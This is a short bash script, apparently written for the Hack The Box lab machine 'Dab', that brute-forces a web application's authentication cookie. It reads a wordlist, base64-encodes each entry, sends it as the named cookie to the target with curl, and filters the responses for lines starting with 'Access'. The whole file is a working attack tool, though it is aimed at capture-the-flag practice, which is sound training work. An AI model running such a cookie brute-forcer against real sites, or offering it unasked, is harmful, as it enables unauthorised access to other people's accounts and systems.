#!/bin/bash
#
# Inspired by Dab@HTB
# 2018-08-22 MM
#

function usage
{
	echo "Usage: $(basename $0) http://host:port cookiename path_to_wordlist"
}

if [ $# -ne 3 ] 
then
	usage
	exit 1
else
	target=$1
	cookie=$2
	wordlist=$3
fi;

while read line
do
	echo $line
	curl -s -H "Cookie: $cookie=$(echo $line|base64)" $target |grep -E '^Access.*';
done<$wordlist
